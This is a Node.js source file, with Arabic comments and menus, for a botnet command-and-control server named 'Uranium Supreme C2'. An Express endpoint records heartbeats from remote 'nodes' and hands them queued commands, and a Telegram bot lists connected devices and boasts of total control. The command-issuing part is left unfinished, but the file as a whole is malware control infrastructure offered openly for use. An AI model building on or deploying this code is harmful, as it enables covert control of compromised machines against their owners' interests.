const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 10000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

// تفعيل بوت التليجرام
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// تخزين الأجهزة المتصلة
const activeNodes = new Map();

// صفحة الويب للتحقق من حالة النظام
app.get('/', (req, res) => {
    res.send('[⚡] Uranium Supreme C2 Server v8.1 Online - Absolute Digital Sovereignty');
});

// استقبال النبضات والأوامر من الأجهزة
app.post('/node/pulse', (req, res) => {
    const { node_id, status, timestamp } = req.body;
    if (!node_id) {
        return res.status(400).send('Invalid Node');
    }

    activeNodes.set(node_id, {
        lastSeen: Date.now(),
        status: status || 'active',
        timestamp: timestamp || Date.now()
    });

    // التحقق هل توجد أوامر معلقة لهذا النود
    const pendingCmd = global.pendingCommands && global.pendingCommands.get(node_id);
    if (pendingCmd) {
        global.pendingCommands.delete(node_id);
        return res.send(`CMD:${pendingCmd}`);
    }

    res.send('ACK');
});

// واجهة تحكم بوت التليجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            keyboard: [
                ['📱 الأجهزة المتصلة', '🎮 لوحة التحكم'],
                ['⚡ تنفيذ أمر عام', '🔥 حالة النظام الخارق']
            ],
            resize_keyboard: true
        }
    };
    bot.sendMessage(chatId, '👑 **لوحة التحكم المركزية لإمبراطورية Uranium Supreme**\n\nاختر من الأزرار:', { parse_mode: 'Markdown', ...opts });
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '📱 الأجهزة المتصلة') {
        if (activeNodes.size === 0) {
            bot.sendMessage(chatId, 'لا توجد أجهزة متصلة حالياً ❌');
        } else {
            let list = '📡 **الأجهزة النشطة حالياً:**\n';
            activeNodes.forEach((data, id) => {
                list += `- Node: \`${id}\` | الحالة: ${data.status}\n`;
            });
            bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
        }
    } else if (text === '🎮 لوحة التحكم' || text === '🔥 حالة النظام الخارق') {
        bot.sendMessage(chatId, '⚡ النظام يعمل بكفاءة مطلقة والسيطرة ميدانية تامة يا ملك التكنولوجيا!');
    }
});

app.listen(PORT, () => {
    console.log(`[+] Uranium C2 Server running on port ${PORT}`);
});
